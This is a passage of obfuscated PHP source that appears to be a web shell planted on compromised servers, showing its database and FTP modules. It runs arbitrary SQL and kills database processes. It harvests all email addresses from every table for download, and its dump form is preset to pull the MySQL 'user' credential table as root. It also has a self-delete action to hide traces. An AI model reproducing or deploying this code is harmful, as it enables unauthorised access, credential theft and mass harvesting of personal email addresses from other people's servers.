                                        '&darr;') : ''), '3')), "13", ($i == (@count($sql->columns) - 1) ? '3' : ''));
                                }
                                echo z7y();
                                $print_arr = array();
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    if (@is_array($sql->rows[$i])) {
                                        $tmparr = array();
                                        foreach ($sql->rows[$i] as $rk => $rv) {
                                            $tmparr[] = $rv;
                                        }
                                        $print_arr[] = $tmparr;
                                    }
                                }
                                @usort($print_arr, "z2b");
                                if ($psql_sort[1] == "d") {
                                    $print_arr = @array_reverse($print_arr);
                                }
                                for ($i = 0; $i < @count($print_arr); $i++) {
                                    echo z6f(($i % 2 ? '0' : '1'));
                                    $cr = 0;
                                    foreach ($print_arr[$i] as $rv) {
                                        $w = "";
                                        for ($a = 0; $a < $sql->num_fields; $a++) {
                                            $w .= " `" . $sql->columns[$a] . "` = '" . @addslashes($print_arr[$i][$a]) .
                                                "' AND";
                                        }
                                        if ($a > 0)
                                            $w = @substr($w, 0, @strlen($w) - 3);
                                        echo ($cr == 0 ? z9c("<nobr>" . z5x(array("act" => "sql", "d", "sql_server",
                                                "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act",
                                                "sql_db", "sel_table", "sql_tbl_insert_q" => $w), z3m("table_act", array("insert" =>
                                                "Edit", "delete" => "Delete"), "3") . z8b("&raquo;", "6")) . "</nobr>", "14",
                                            "28") : "") . z9c((@is_null($rv) ? 'NULL' : @htmlspecialchars($rv)), "14", ($cr ==
                                            (@count($print_arr[$i]) - 1) ? '3' : ''));
                                        $cr++;
                                    }
                                    echo z7y();
                                }
                                echo z10q() . z7f() . z7y() . z10q() . z5h() . z7f() . z7y() . z10q();
                            }
                        }
                    } elseif ($sql_act == "db_act" && @isset($db_act) && $db_act == "select" && @
                    isset($sql_db) && !@empty($sql_db)) {
                        echo z3q(z9y("366", $sql_db), "1");
                        $sql->query('SHOW TABLE STATUS;');
                        if ($sql->get_result()) {
                            $psql_sort = z5r($sql_sort);
                            if ($psql_sort[1] != 'a') {
                                $psql_sort[1] = 'd';
                            } else {
                                $psql_sort[1] = 'a';
                            }
                            if ($psql_sort[0] >= $sql->num_fields)
                                $psql_sort[0] = '0';
                            $v = $psql_sort[0];
                            echo z9m('2') . z7o() . z7j() . z5z('', "0") . z9m("2") . z7o() . z7j();
                            echo z9m('2') . z6f();
                            for ($i = 0; $i < $sql->num_fields; $i++) {
                                echo z9c(z5x(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass",
                                        "sql_port", "sql_engine", "sql_act", "db_act", "sql_db", "sel_table", "sql_page",
                                        "sql_sort" => ($psql_sort[0] == "$i" ? "$i" . ($psql_sort[1] == "a" ? "d" : "a") :
                                        "$i" . $psql_sort[1])), z8b(($i == 0 ? "Table " : "") . $sql->columns[$i] . ($psql_sort[0] ==
                                    "$i" ? ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13", ($i ==
                                    0 ? "2" : ($i == ($sql->num_fields - 1) ? '3' : ''))) . ($i == 0 ? z9c(z9y("369"),
                                    "13", "8") : '');
                            }
                            echo z7y();
                            $print_arr = array();
                            for ($i = 0; $i < $sql->num_rows; $i++) {
                                if (@is_array($sql->rows[$i])) {
                                    $tmparr = array();
                                    foreach ($sql->rows[$i] as $rk => $rv) {
                                        $tmparr[] = $rv;
                                    }
                                    $print_arr[] = $tmparr;
                                }
                            }
                            @usort($print_arr, "z2b");
                            if ($psql_sort[1] == "d") {
                                $print_arr = @array_reverse($print_arr);
                            }
                            for ($i = 0; $i < @count($print_arr); $i++) {
                                echo z6f(($i % 2 ? '0' : '1'));
                                $cr = 0;
                                foreach ($print_arr[$i] as $rv) {
                                    echo z9c((@is_null($rv) ? 'NULL' : ($cr == 0 ? "<nobr>" . z5x(array("act" =>
                                            "sql", "sql_server", "sql_user", "sql_pass", "sql_port", "sql_engine", "d",
                                            "sql_act" => "table_act", "sql_db", "sel_table" => $rv, "table_act" => "browse"),
                                        z8b($rv, "11")) . "</nobr>" : @htmlspecialchars($rv))), "14", ($cr == 0 ? '2' :
                                        ($cr == (@count($print_arr[$i]) - 1) ? '3' : '')));
                                    if ($cr == 0)
                                        echo z9c("<nobr>" . z5x(array("act" => "sql", "d", "sql_server", "sql_user",
                                                "sql_pass", "sql_port", "sql_engine", "sql_act" => "table_act", "sql_db",
                                                "sel_table" => $rv), z3m("table_act", $table_actions, "3") . z8b("&raquo;", "6")) .
                                            "</nobr>", "14", "8");
                                    $cr++;
                                }
                                echo z7y();
                            }
                            echo z10q() . z7f() . z7y() . z10q() . z5h() . z7f() . z7y() . z10q();
                        }
                    }
                }
                if ($sql_act == "query") {
                    echo z3q(z9y("370"));
                    echo z9m("2") . z5x(array("act" => "sql", "d", "sql_server", "sql_user",
                            "sql_pass", "sql_port", "sql_engine", "sql_act" => "query", "query_confirm" =>
                            "1"), z5b() . z7u(z5t(z9y("364")) . z9c(z5y("sql_db", "", "7"))) . z9d(z5t(z9y("370")) .
                        z9c(z5w("sql_query", "5") . (@isset($sql_query) ? @htmlspecialchars($sql_query) :
                        "") . z5q())) . z7u(z5t(z9x()) . z9c(z8b(z9y("371"), "7"))) . z5b()) . z10q();
                    if (@isset($query_confirm) && $query_confirm) {
                        if (@isset($sql_db) && !@empty($sql_db)) {
                            $sql->base = $sql_db;
                            if (!$sql->select_db()) {
                                echo z3q(z9y("447"));
                            }
                        }
                        $q_sql_error = '';
                        $q_sql_result = '';
                        if (@strlen($sql_query) > 5) {
                            $q_sql_result .= z3q(z9y("394"));
                            switch ($sql->query($sql_query)) {
                                case '0':
                                    $q_sql_result .= z3q("ERROR : " . $sql->error);
                                    break;
                                case '1':
                                    if ($sql->get_result()) {
                                        $q_sql_result .= z9m('2') . z7o() . z7j() . z5z('', "0") . z9m("2") . z7o() .
                                            z7j();
                                        foreach ($sql->columns as $k => $v)
                                            $sql->columns[$k] = @htmlspecialchars($v, ENT_QUOTES);
                                        $keys = "";
                                        $count_keys = @count($sql->columns);
                                        $key_num = 0;
                                        foreach ($sql->columns as $column) {
                                            if ($key_num == 0) {
                                                $keys .= z9c($column, "13", "02");
                                            } elseif ($key_num == ($count_keys - 1)) {
                                                $keys .= z9c($column, "13", "03");
                                            } else {
                                                $keys .= z9c($column, "13", "0");
                                            }
                                            $key_num++;
                                        }
                                        $q_sql_result .= z7u($keys);
                                        for ($i = 0; $i < $sql->num_rows; $i++) {
                                            foreach ($sql->rows[$i] as $k => $v)
                                                $sql->rows[$i][$k] = @htmlspecialchars($v, ENT_QUOTES);
                                            $values = "";
                                            $count_values = @count($sql->rows[$i]);
                                            $value_num = 0;
                                            foreach ($sql->rows[$i] as $row) {
                                                if ($value_num == 0) {
                                                    $values .= z9c($row, "14", "2");
                                                } elseif ($value_num == ($count_values - 1)) {
                                                    $values .= z9c($row, "14", "3");
                                                } else {
                                                    $values .= z9c($row, "14");
                                                }
                                                $value_num++;
                                            }
                                            $q_sql_result .= z7u($values, ($i % 2 ? '0' : '1'));
                                        }
                                        $q_sql_result .= z7f() . z7y() . z10q() . z5h() . z7f() . z7y() . z10q();
                                    }
                                    break;
                                case '2':
                                    $ar = $sql->affected_rows() ? ($sql->affected_rows()) : ('0');
                                    $q_sql_result .= z3q("AFFECTED ROWS: " . $ar);
                                    break;
                            }
                        }
                        if ($q_sql_result != '') {
                            echo $q_sql_result;
                            $q_sql_result = '';
                        }
                    }
                }
                if ($sql_act == "emails") {
                    $emails = array();
                    if (!@isset($emails_filename))
                        $emails_filename = $tempdir . "emails_" . @getenv("SERVER_NAME") . "_db_" . @
                            date("d-m-Y_H-i-s") . ".txt";
                    if (@isset($sql_db) && !@empty($sql_db)) {
                        $sql->base = $sql_db;
                        if ($sql->select_db()) {
                            $table_list = array();
                            $sql->query('SHOW TABLES FROM ' . $sql_db . ';');
                            if ($sql->get_result()) {
                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                    foreach ($sql->rows[$i] as $rk => $rv) {
                                        $table_list[] = $rv;
                                    }
                                }
                            }
                        }
                    }
                    if (!@isset($sql_tables) || @empty($sql_tables)) {
                        if (@isset($sel_table) && !@empty($sel_table)) {
                            $sql_tables = $sel_table;
                        } else {
                            $sql_tables = (@count($table_list) > 0 ? @implode(",", $table_list) : "");
                        }
                    } elseif (@isset($table_list) && @is_array($table_list)) {
                        $tmp_tables = @explode(",", $sql_tables);
                        $sql_tables = "";
                        foreach ($tmp_tables as $tmp_table) {
                            $tmp_table = @trim($tmp_table);
                            if (@in_array($tmp_table, $table_list)) {
                                $sql_tables .= $tmp_table . ",";
                            } else {
                                break;
                            }
                        }
                        if (@empty($sql_tables))
                            $sql_tables = @implode(",", $table_list);
                    }
                    echo z3q(z9y("372"));
                    echo z9m("2") . z5x(array("act" => "sql", "d", "sql_server", "sql_user",
                            "sql_pass", "sql_port", "sql_engine", "sql_act" => "emails", "dump_confirm" =>
                            "1"), z5b() . z7u(z5t(z9y("364")) . z9c(z3m("sql_db", $db_list, "7", 1))) . z7u
                        (z5t(z9y("373")) . z9c(z5w("sql_tables", "5") . (@isset($sql_tables) ? @
                        htmlspecialchars($sql_tables) : "") . z5q())) . z7u(z5t(z9y("374")) . z9c(z5y("emails_filename",
                        $emails_filename, "7"))) . z7u(z5t(z9x()) . z9c(z5u("sql_save2file", z9y("375"),
                        "sql_save2file") . z9x() . z5u("sql_download", z9y("376"), "sql_download"))) .
                        z7u(z5t(z9x()) . z9c(z8b(z9y("377"), "7"))) . z5b()) . z10q();
                    if (@isset($dump_confirm) && $dump_confirm) {
                        $fp = 0;
                        if (@isset($sql_save2file) && $sql_save2file == "1" && @isset($dump_filename) &&
                            !@empty($dump_filename)) {
                            $fp = @fopen($emails_filename, "w");
                        }
                        $dumping_arr = array();
                        $tmp_tables = @explode(",", $sql_tables);
                        foreach ($tmp_tables as $tmp_table) {
                            $tmp_table = @trim($tmp_table);
                            $dumping_arr[] = $tmp_table;
                        }
                        $dumping_arr = @array_unique($dumping_arr);
                        $sql->base = $sql_db;
                        if (!$sql->select_db()) {
                            echo z3q(z9y("447"));
                        } elseif (@count($dumping_arr) < 1) {
                            echo z3q(z9y("448"));
                        } else {
                            foreach ($dumping_arr as $dump_table) {
                                if ($sql->parse_fields($dump_table)) {
                                    foreach ($sql->columns as $ck => $cv) {
                                        if ($sql->query("SELECT " . $cv . " FROM " . $dump_table . " WHERE " . $cv .
                                            " REGEXP '^[^@]+@[^@]+\.[^@]{2,}$';")) {
                                            if ($sql->get_result()) {
                                                for ($i = 0; $i < $sql->num_rows; $i++) {
                                                    $tmpmails = z3k($sql->rows[$i][$cv]);
                                                    if (@count($tmpmails) > 0) {
                                                        foreach ($tmpmails as $mtmp)
                                                            $emails[] = $mtmp;
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            $emails = @array_unique($emails);
                            if (@count($emails) > 0) {
                                $maildump = @implode("\r\n", $emails);
                                if (@isset($sql_download) && $sql_download == "1") {
                                    @ob_clean();
                                    @header("Content-type: application/octet-stream");
                                    @header("Content-length: " . @strlen($maildump));
                                    @header("Content-disposition: attachment; filename=\"" . @basename($emails_filename) .
                                        "\";");
                                    echo $maildump;
                                    exit();
                                }
                                if (!@isset($sql_save2file) || $sql_save2file != "1") {
                                    echo z9m('2') . z6f() . z6q() . z5w('', '1') . @htmlspecialchars($maildump) .
                                        z5q() . z7f() . z7y() . z10q() . z6s();
                                } elseif ($fp || @function_exists('file_put_contents')) {
                                    if (@fwrite($fp, $maildump) or @fputs($fp, $maildump) or @file_put_contents($emails_filename,
                                        $maildump)) {
                                        echo z3q(z9y("449", $emails_filename));
                                    } else {
                                        echo z3q(z9y("450"));
                                    }
                                } else {
                                    echo z3q(z9y("450"));
                                }
                            }
                        }
                    }
                }
                if ($sql_act == "serverstatus") {
                    echo z3q(z9y("378"), "1");
                    $sql->query("SHOW STATUS");
                    if ($sql->get_result()) {
                        echo z9m('2') . z7u(z9c(z9y("380"), "13", "2") . z9c(z9y("381"), "13", "3"));
                        for ($i = 0; $i < $sql->num_rows; $i++) {
                            echo z6f(($i % 2 ? '0' : '1'));
                            $cr = 0;
                            foreach ($sql->rows[$i] as $rk => $rv) {
                                echo z9c($rv, "14", ($cr == 0 ? '25' : ($cr == (@count($sql->rows[$i]) - 1) ?
                                    '3' : '')));
                                $cr++;
                            }
                            echo z7y();
                        }
                        echo z10q();
                    }
                }
                if ($sql_act == "servervars") {
                    echo z3q(z9y("379"), "1");
                    $sql->query("SHOW VARIABLES");
                    if ($sql->get_result()) {
                        echo z9m('2') . z7u(z9c(z9y("380"), "13", "2") . z9c(z9y("381"), "13", "3"));
                        for ($i = 0; $i < $sql->num_rows; $i++) {
                            echo z6f(($i % 2 ? '0' : '1'));
                            $cr = 0;
                            foreach ($sql->rows[$i] as $rk => $rv) {
                                echo z9c($rv, "14", ($cr == 0 ? '25' : ($cr == (@count($sql->rows[$i]) - 1) ?
                                    '3' : '')));
                                $cr++;
                            }
                            echo z7y();
                        }
                        echo z10q();
                    }
                }
                if ($sql_act == "processes") {
                    if (@isset($kill) && !@empty($kill)) {
                        $query = "KILL " . $kill . ";";
                        $sql->query($query);
                        echo z3q(z9y("393", $kill), "1");
                    } else {
                        echo z3q(z9y("382"), "1");
                    }
                    $sql->query("SHOW PROCESSLIST;");
                    if ($sql->get_result()) {
                        echo z9m('2') . z7u(z9c(z9y("383"), "13", "2") . z9c(z9y("384"), "13") . z9c(z9y
                            ("385"), "13") . z9c(z9y("386"), "13") . z9c(z9y("387"), "13") . z9c(z9y("388"),
                            "13") . z9c(z9y("389"), "13") . z9c(z9y("390"), "13") . z9c(z9y("391"), "13",
                            "3"));
                        for ($i = 0; $i < $sql->num_rows; $i++) {
                            echo z6f(($i % 2 ? '0' : '1'));
                            $cr = 0;
                            $pid = '';
                            foreach ($sql->rows[$i] as $rk => $rv) {
                                echo z9c($rv, "14", ($cr == 0 ? '5' : ''));
                                if ($cr == 0)
                                    $pid = $rv;
                                $cr++;
                            }
                            echo z9c(z5x(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass",
                                    "sql_port", "sql_engine", "sql_act" => "processes", "kill" => $pid), z8b(z9y("392"),
                                "7")), "14");
                            echo z7y();
                        }
                        echo z10q();
                    }
                }
                if ($sql_act == "showdb") {
                    $psql_sort = z5r($sql_sort);
                    if ($psql_sort[1] != 'a')
                        $psql_sort[1] = 'd';
                    if ($psql_sort[0] > 2)
                        $psql_sort[0] = '0';
                    $v = $psql_sort[0];
                    echo z3q(z9y("359"), "1");
                    echo z9m('2');
                    echo z7u(z9c(z5x(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass",
                            "sql_port", "sql_engine", "sql_sort" => ($psql_sort[0] == '0' ? '0' . ($psql_sort[1] ==
                            "a" ? "d" : "a") : '0' . $psql_sort[1])), z8b(z9y("360") . ($psql_sort[0] == '0' ?
                        ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13", "2") .
                        z9c(z5x(array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass",
                            "sql_port", "sql_engine", "sql_sort" => ($psql_sort[0] == '1' ? '1' . ($psql_sort[1] ==
                            "a" ? "d" : "a") : '1' . $psql_sort[1])), z8b(z9y("361") . ($psql_sort[0] == '1' ?
                        ' ' . ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13") . z9c(z5x
                        (array("act" => "sql", "d", "sql_server", "sql_user", "sql_pass", "sql_port",
                            "sql_engine", "sql_sort" => ($psql_sort[0] == '2' ? '2' . ($psql_sort[1] == "a" ?
                            "d" : "a") : '2' . $psql_sort[1])), z8b(z9y("362") . ($psql_sort[0] == '2' ? ' ' .
                        ($psql_sort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), "13") . z9c(z9y("363"),
                        "13", "3"));
                    if (@count($db_list) > 1) {
                        $def_db = $sql->base;
                        $total_tables = 0;
                        $total_size = 0;
                        $print_arr = array();
                        foreach ($sql->list_dbs() as $k => $kv) {
                            $sql->base = $k;
                            $tables = "0";
                            $size = "0";
                            if ($sql->select_db()) {
                                $sql->query("SHOW TABLES;");
                                if ($sql->get_result())
                                    $tables = $sql->num_rows;
                                $sql->query("SELECT round(data_length + index_length) FROM information_schema.TABLES WHERE table_schema = \"" .
                                    $k . "\";");
                                if ($sql->get_result())
                                    $size = @implode('', $sql->rows[0]);
                            }
                            $print_arr[] = array($k, $size, $tables);
                            $total_tables += $tables;
                            $total_size += $size;
                        }
                        $sql->base = $def_db;
                        $sql->select_db();
                    }
                    if (@count($print_arr) > 0) {
                        $count = 0;
                        @usort($print_arr, "z2b");
                        if ($psql_sort[1] == "d") {
                            $print_arr = @array_reverse($print_arr);
                        }
                        foreach ($print_arr as $ar) {
                            echo z7u(z9c(z5x(array("act" => "sql", "sql_server", "sql_user", "sql_pass",
                                    "sql_port", "sql_engine", "sql_act" => "db_act", "db_act" => "select", "d",
                                    "sql_db" => $ar[0]), z8b($ar[0], "11")), "14", "2") . z9c(z7x($ar[1]), "14") .
                                z9c($ar[2], "14") . z9c("<nobr>" . z5x(array("act" => "sql", "d", "sql_server",
                                    "sql_user", "sql_pass", "sql_port", "sql_engine", "sql_act" => "db_act",
                                    "sql_db" => $ar[0]), z3m("db_act", $db_actions, "3") . z8b("&raquo;", "6")) .
                                "</nobr>", "14", "38"), ($count % 2 ? '0' : '1'));
                            $count++;
                        }
                        echo z7u(z9c(z7n(z9y("409", $count)), "13", "2") . z9c(z7x($total_size), "13") .
                            z9c($total_tables, "13") . z9c(z9x(), "13", "3"));
                    }
                    echo z10q();
                }
            }
        } else {
            $hmsg = z9y("191");
        }
    }
    if (!$hideconnect) {
        if (!@isset($q_sql_query))
            $q_sql_query = "SHOW DATABASES;\nSELECT * FROM user;";
        if (!@isset($q_sql_filename))
            $q_sql_filename = $tempdir . "dump_" . @getenv("SERVER_NAME") . "_db_" . @date("d-m-Y_H-i-s") .
                ".sql";
        $available_arr = array();
        if ($bmysql)
            $available_arr["MySQL"] = "MySQL";
        if ($bmssql)
            $available_arr["MSSQL"] = "MSSQL";
        if ($bpostgres)
            $available_arr["PostgreSQL"] = "PostgreSQL";
        if ($boracle)
            $available_arr["Oracle"] = "Oracle";
        echo z3q(z9y("451") . ($hmsg != '' ? ' : ' . $hmsg : ''));
        echo z9m('2') . z5x(array("act" => "sql", "d"), z5b() . z7u(z6z(z7n(z9y("452"))) .
            z7k(z5y("sql_server", "127.0.0.1", "4") . ":" . z5y("sql_port", "3306", "1")) .
            z6z(z7n(z9y("453"))) . z7k(z5y("sql_user", "root", "4")) . z6z(z7n(z9y("454"))) .
            z7k(z5y("sql_pass", "", "4")) . z6z(z7n(z9y("455"))) . z7k(z5y("sql_db", "", "4")) .
            z6z(z7n(z9y("456"))) . z7k(z3m("sql_engine", array("MySQL" => "MySQL"), "4", 1) .
            z8b(z9y("457"), "7")))) . z10q();
        echo z6s();
        echo z3q(array(z9y("410"), z9y("420")), '46');
        echo z9m('2') . z9d(z9c(z5x(array("act" => "sql", "d", "q_sql_action" => "dump"),
            z9m() . z5b() . z7u(z5t(z9y("411")) . z9c(z3m("q_sql_engine", $available_arr,
            "4", 1))) . z7u(z5t(z9y("412")) . z9c(z5y("q_sql_server", "127.0.0.1", '4') .
            ":" . z5y("q_sql_port", "3306", "1"))) . z7u(z5t(z9y("413")) . z9c(z5y("q_sql_user",
            "root", "4") . ":" . z5y("q_sql_pass", "", "4"))) . z7u(z5t(z9y("414")) . z9c(z5y
            ("q_sql_db", "mysql", "4") . "." . z5y("q_sql_table", "user", "4"))) . z7u(z5t(z9y
            ("415")) . z9c(z5y("q_sql_filename", $q_sql_filename, "8"))) . z7u(z5t(z9x()) .
            z9c(z5u("q_sql_download", z9y("416"), "q_sql_download"))) . z7u(z5t(z9x()) . z9c
            (z5u("q_sql_save2file", z9y("417"), "q_sql_save2file"))) . z7u(z5t(z9x()) . z9c
            (z8b(z9y("418"), "7"))) . z5b() . z10q()), '', '4') . z9c(z5x(array("act" =>
                "sql", "d", "q_sql_action" => "query"), z9m() . z5b() . z7u(z5t(z9y("411")) .
            z9c(z3m("q_sql_engine", $available_arr, "4", 1))) . z7u(z5t(z9y("412")) . z9c(z5y
            ("q_sql_server", "127.0.0.1", "4") . ":" . z5y("q_sql_port", "3306", "1"))) .
            z7u(z5t(z9y("413")) . z9c(z5y("q_sql_user", "root", "4") . ":" . z5y("q_sql_pass",
            "", "4"))) . z7u(z5t(z9y("421")) . z9c(z5y("q_sql_db", "mysql", "4"))) . z9d(z5t
            (z9y("370")) . z9c(z5w("q_sql_query", "4") . @htmlspecialchars($q_sql_query) .
            z5q())) . z7u(z5t(z9x()) . z9c(z8b(z9y("422"), "7"))) . z5b() . z10q()), '',
            "46")) . z10q();
        if (@isset($q_sql_action) && $q_sql_action == "query") {
            $sql = new my_sql();
            $sql->db = $q_sql_engine;
            $sql->host = $q_sql_server;
            $sql->port = $q_sql_port;
            $sql->user = $q_sql_user;
            $sql->pass = $q_sql_pass;
            $sql->base = $q_sql_db;
            $querys = @explode(';', $q_sql_query);
            $q_sql_connect_error = "";
            $q_sql_error = '';
            $q_sql_result = '';
            if (!$sql->connect())
                $q_sql_connect_error = z3q(z9y("419"));
            else {
                if (!empty($sql->base) && !$sql->select_db())
                    $q_sql_connect_error = z3q(z9y("447"));
                else {
                    foreach ($querys as $num => $query) {
                        if (@strlen($query) > 5) {
                            $q_sql_result .= z3q(z9y("423", array($num, @htmlspecialchars($query, ENT_QUOTES))));
                            switch ($sql->query($query)) {
                                case '0':
                                    $q_sql_result .= z3q("ERROR : " . $sql->error);
                                    break;
                                case '1':
                                    if ($sql->get_result()) {
                                        $q_sql_result .= z9m('2') . z7o() . z7j() . z5z('', "0") . z9m("2") . z7o() .
                                            z7j();
                                        foreach ($sql->columns as $k => $v)
                                            $sql->columns[$k] = @htmlspecialchars($v, ENT_QUOTES);
                                        $keys = "";
                                        $count_keys = @count($sql->columns);
                                        $key_num = 0;
                                        foreach ($sql->columns as $column) {
                                            if ($key_num == 0) {
                                                $keys .= z9c($column, "13", "02");
                                            } elseif ($key_num == ($count_keys - 1)) {
                                                $keys .= z9c($column, "13", "03");
                                            } else {
                                                $keys .= z9c($column, "13", "0");
                                            }
                                            $key_num++;
                                        }
                                        $q_sql_result .= z7u($keys);
                                        for ($i = 0; $i < $sql->num_rows; $i++) {
                                            foreach ($sql->rows[$i] as $k => $v)
                                                $sql->rows[$i][$k] = @htmlspecialchars($v, ENT_QUOTES);
                                            $values = "";
                                            $count_values = @count($sql->rows[$i]);
                                            $value_num = 0;
                                            foreach ($sql->rows[$i] as $row) {
                                                if ($value_num == 0) {
                                                    $values .= z9c($row, "14", "2");
                                                } elseif ($value_num == ($count_values - 1)) {
                                                    $values .= z9c($row, "14", "3");
                                                } else {
                                                    $values .= z9c($row, "14");
                                                }
                                                $value_num++;
                                            }
                                            $q_sql_result .= z7u($values, ($i % 2 ? '0' : '1'));
                                        }
                                        $q_sql_result .= z7f() . z7y() . z10q() . z5h() . z7f() . z7y() . z10q();
                                    }
                                    break;
                                case '2':
                                    $ar = $sql->affected_rows() ? ($sql->affected_rows()) : ('0');
                                    $q_sql_result .= z3q("AFFECTED ROWS: " . $ar);
                                    break;
                            }
                        }
                        if ($q_sql_result != '') {
                            echo $q_sql_result;
                            $q_sql_result = '';
                        }
                    }
                }
            }
            if ($q_sql_connect_error != "") {
                echo $q_sql_connect_error;
            }
        }
        if (@isset($q_sql_action) && $q_sql_action == "dump") {
            $fp = 0;
            if (@isset($q_sql_save2file) && $q_sql_save2file == "1" && @isset($q_sql_filename) &&
                !@empty($q_sql_filename)) {
                $fp = @fopen($q_sql_filename, "w");
            }
            $q_sql_filename = @str_replace("_db_", "_" . $q_sql_db . "_", $q_sql_filename);
            $sql = new my_sql();
            $sql->db = $q_sql_engine;
            $sql->host = $q_sql_server;
            $sql->port = $q_sql_port;
            $sql->user = $q_sql_user;
            $sql->pass = $q_sql_pass;
            $sql->base = $q_sql_db;
            $q_sql_dumped = "";
            if (!$sql->connect()) {
                echo z3q(z9y("419"));
            } elseif (!$sql->select_db()) {
                echo z3q(z9y("447"));
            } elseif (!$sql->dump($q_sql_table)) {
                echo z3q(z9y("458"));
            } else {
                foreach ($sql->dump as $v)
                    $q_sql_dumped .= $v . "\r\n";
                if (@isset($q_sql_download) && $q_sql_download == "1") {
                    @ob_clean();
                    @header("Content-type: application/octet-stream");
                    @header("Content-length: " . @strlen($q_sql_dumped));
                    @header("Content-disposition: attachment; filename=\"" . @basename($q_sql_filename) .
                        "\";");
                    echo $q_sql_dumped;
                    exit();
                }
                if (!@isset($q_sql_save2file) || $q_sql_save2file != "1") {
                    echo z9m('2') . z6f() . z6q() . z5w('', '1') . @htmlspecialchars($q_sql_dumped) .
                        z5q() . z7f() . z7y() . z10q() . z6s();
                } else
                    if ($fp || @function_exists('file_put_contents')) {
                        if (@fwrite($fp, $q_sql_dumped) or @fputs($fp, $q_sql_dumped) or @
                            file_put_contents($q_sql_filename, $q_sql_dumped)) {
                            z3q(z9y("459"));
                        } else {
                            echo z3q(z9y("450"));
                        }
                    } else {
                        echo z3q(z9y("450"));
                    }
            }
        }
    }
}
if ($act == "selfremove") {
    if (@isset($dconfirm) && $dconfirm) {
        if ($saddr != "127.0.0.1")
            echo z3q((@unlink(__file__) ? z9y("462") : z9y("463", __file__)));
    } else {
        echo z3q(z9y("460"));
        echo z6s() . z10w(z7u(z6l(z7n(z9y("461")) . z5x(array("act" => "selfremove", "d",
                "dconfirm" => "1"), z8b(z9y("21"), "7")) . z9x() . z5x($back_form_actions, z8b(z9y
            ("22"), '7')))), "2") . z6s();
    }
}
if ($act == 'ftp') {
    $a_transfer = array("FTP_BINARY" => "FTP_BINARY", "FTP_ASCII" => "FTP_ASCII");
    $hmsg = '';
    $hideconnect = 0;
    $jsid = 0;
    if (@isset($ftp_server) && !@isset($ftp_passive))
        $ftp_passive = 0;
    if (!@isset($ftp_server) && !@isset($ftp_passive))
        $ftp_passive = "1";
    if (@isset($ft) && $ft == "logoff") {
        if (@isset($_SESSION['ftp_server'])) {
            z0i('ftp_current_dir' . $_SESSION['ftp_server']);
        }
        z0i('ftp_server');
        z0i('ftp_username');
        z0i('ftp_password');
        z0i('ftp_port');
        z0i('ftp_passive');
        z0i('ftp_session');
    }
    $ftp_session = 0;
    if (@isset($_SESSION['ftp_session'])) {
        $ftp_server = $_SESSION['ftp_server'];
        $ftp_username = $_SESSION['ftp_username'];
        $ftp_password = $_SESSION['ftp_password'];
        $ftp_port = $_SESSION['ftp_port'];
        $ftp_passive = $_SESSION['ftp_passive'];
        $ftp_session = 1;
    }
    if (!@empty($ftp_server) && !@empty($ftp_port) && !@empty($ftp_username) && !@
        empty($ftp_password) && !@isset($ftp_quickaction)) {
        $ftp = new ftp($ftp_server, $ftp_port, $ftp_username, $ftp_password, $ftp_passive);
        if ($ftp->loggedOn) {
            if (!@isset($ftp_current_dir) || @empty($ftp_current_dir)) {
                $ftp_current_dir = z1k((@isset($_SESSION['ftp_current_dir' . $ftp_server]) ? $_SESSION['ftp_current_dir' .
                    $ftp_server] : '/'));
            }
            if (@isset($rd))
                $ftp_current_dir = z1k($ftp_current_dir . $rd);
            $ftp->setCurrentDir($ftp_current_dir);
            $ftp_current_dir = $ftp->currentDir;
            $_SESSION['ftp_current_dir' . $ftp_server] = $ftp_current_dir;
            $_SESSION['ftp_server'] = $ftp_server;
            $_SESSION['ftp_username'] = $ftp_username;
            $_SESSION['ftp_password'] = $ftp_password;
            $_SESSION['ftp_port'] = $ftp_port;
            $_SESSION['ftp_passive'] = $ftp_passive;
            $_SESSION['ftp_session'] = 1;
            $hideconnect = 1;
            $hmsg = z5x(array("act" => "ftp", "d", "ft" => "logoff"), z8b(z9y("196"), "1"));
        } else {
            $hmsg = z9y("191");
        }
    }
    if (!@isset($ftp_server) || @empty($ftp_server))
        $ftp_server = "127.0.0.1";
    if (!@isset($ftp_port) || @empty($ftp_port))
        $ftp_port = "21";
    if (!@isset($ftp_username) || @empty($ftp_username))
        $ftp_username = "anonymous";
    if (!@isset($ftp_password) || @empty($ftp_password))
        $ftp_password = "anonymous@ftp.com";
    if (!@isset($ftp_localfile) || @empty($ftp_localfile))
        $ftp_localfile = $d;
    if (!@isset($ftp_remotefile) || @empty($ftp_remotefile))
        $ftp_remotefile = "/ftp-dir/somefile.txt";
    if ($hideconnect) {
        if (@isset($lmkdir) && $lmkdir && @isset($ldir) && !@empty($ldir)) {
            @mkdir($d . $ldir);
        }
        if (@isset($fmkdir) && $fmkdir && @isset($fdir) && !@empty($fdir)) {
            $ftp->makeDir(z1k($ftp_current_dir) . $fdir);
        }
        $ltarr = array();
        $rtarr = array();
        if (@isset($action) && !@empty($action) && (@isset($ltall) || @isset($rtall))) {
            $ft = $action;
            if (@isset($rtall) || @strstr($rtall, "\n")) {
                $rtarr = @explode("\n", $rtall);
            } elseif (@isset($ltall) || @strstr($ltall, "\n")) {
                $ltarr = @explode("\n", $ltall);
            }
        }
        if (@isset($ft)) {
            switch ($ft) {
                case "delete":
                    if (@isset($lt) && !@empty($lt) && z4r($lt)) {
                        z8s($lt);
                    } elseif (@isset($rt) && !@empty($rt)) {
                        $ftp->deleteObject(z1k($ftp_current_dir) . $rt);
                    } elseif (@count($ltarr) > 0) {
                        foreach ($ltarr as $lto) {
                            $lto = @trim($lto);
                            if (!@empty($lto) && z4r($lto)) {
                                z8s($lto);
                            }
                        }
                    } elseif (@count($rtarr) > 0) {
                        foreach ($rtarr as $rto) {
                            $rto = @trim($rto);
                            if (!@empty($rto)) {
                                $ftp->deleteObject(z1k($ftp_current_dir) . $rto);
                            }
                        }
                    }
                    break;
